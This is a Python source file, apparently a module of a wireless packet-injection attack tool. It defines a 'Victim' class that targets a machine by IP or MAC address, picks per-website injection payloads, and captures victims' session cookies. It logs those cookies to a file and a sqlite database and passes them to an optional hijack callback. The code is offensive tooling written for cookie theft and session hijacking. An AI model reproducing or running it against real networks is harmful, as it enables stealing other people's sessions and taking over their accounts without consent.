from lib.logger import Database, Logfile

### Pretty confident these modules aren't needed here
#from Queue import Queue, Empty
#from threading import Thread
#from scapy.all import *
#import binascii, fcntl, gzip, socket, struct, sys, time

class bcolors(object):
    """Define the color schema"""

    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Victim(object):
    """Victim class is your target, define it by setting ip or mac address.

    It needs an instance of VictimParameters, where you set what you want to inject per victim.
    This allows for different attacks per target.
    This class is used by PacketHandler class.
    """

    def __init__(self, *positional_parameters, **keyword_parameters):
        self.cookies = []
        self.db = Database('cookies.db')
        self.log = Logfile()

        if ('ip' in keyword_parameters):
            self.ip = keyword_parameters['ip']
        else:
            self.ip = None

        if ('mac' in keyword_parameters):
            self.mac = keyword_parameters['mac']
        else:
            self.mac = None

        if ('victim_parameters' in keyword_parameters):
            self.victim_parameters = keyword_parameters['victim_parameters']
        else:
            self.victim_parameters = None

        if (self.ip is None and self.mac is None):
            print "[ERROR] Victim: No IP or Mac, or in_request selected"
            exit(1)

        if (self.victim_parameters is None):
            print "[ERROR] Please create VictimParameters for this Victim"
            exit(1)


    def get_injection(self):
        '''Returns injection for victim.'''
        ## CASE: no in_request defined, return injections for --websites if defined, then --injection if defined
        ### Need to cleanup this nest
        if (self.victim_parameters.in_request is None):
            if (self.victim_parameters.websites is not None):
                for website in self.victim_parameters.websites:
                    exists = 0
                    for cookie in self.cookies:
                        if (cookie[0] in website):
                            exists = 1
                    if (not exists):
                        for inject in self.victim_parameters.website_injects:
                            if (inject[0] == website):
                                #print inject[0]
                                return inject[1]

            if (self.victim_parameters.inject_file is not None):
                if (self.victim_parameters.file_injected == 0):
                    return self.victim_parameters.file_inject

        ## CASE: in_request is defined, return injections for --websites if defined, then --injection if defined
        ### Need to cleanup this nest
        else:
            if (self.victim_parameters.websites is not None):
                for website in self.victim_parameters.websites:
                    exists = 0
                    for cookie in self.cookies:
                        if (cookie[0] in website):
                            exists = 1
                    if (not exists):
                        for inject in self.victim_parameters.website_injects:
                            if (inject[0] == website):
                                #print inject[0]
                                return inject[1]

            if (self.victim_parameters.inject_file is not None):
                if (self.victim_parameters.file_injected == 0):
                    return self.victim_parameters.file_inject


    def check_add_cookie(self, cookie, args):
        '''Checks if cookie has already been captured.'''
        exists = 0
        for existing_cookie in self.cookies:
            if (existing_cookie[0] == cookie[0]):
                exists = 1

        if (not exists and cookie[1] != "NONE"):
            print ""
            print "[+] New cookie detected for ", self.mac
            print cookie
            ### Trace why no ip...
            #print self.ip
            #print self.mac
            #print cookie[0]
            #print cookie[1]
            if not args.t:
                self.log.cookies(self.ip, self.mac, cookie[0], cookie[1])
                self.db.sqlite_cookies(self.ip, self.mac, cookie[0], cookie[1])
            else:
                ip = ''
                self.log.cookies(ip, self.mac, cookie[0], cookie[1])
                self.db.sqlite_cookies(ip, self.mac, cookie[0], cookie[1])
            
            if (self.victim_parameters.highjack is not None):
                self.victim_parameters.highjack(cookie)
            self.cookies.append(cookie)

        else:
            if (cookie[1] == "NONE"):
                ## ADD THE NONE ANYWAY COOKIE SO GET_INJECTION() CAN SKIP TO THE NEXT IFRAME
                self.cookies.append(cookie)
                if (self.ip is not None):
                    print ""
                    print bcolors.WARNING + "[!] No cookie on client", self.ip, " for website", cookie[0] + bcolors.ENDC
                else:
                    print ""
                    print bcolors.WARNING + "[!] No cookie on client", self.mac, " for website", cookie[0] + bcolors.ENDC


    def add_cookie(self, cookie, args):
        '''Cookie handling function, if --websites is set, ignores all cookies for hosts other than specified.'''
        ## Print cookie
        if (self.victim_parameters.websites is not None):
            for website in self.victim_parameters.websites:
                if (cookie[0] in website):
                    self.check_add_cookie(cookie, args)
        else:
            self.check_add_cookie(cookie, args)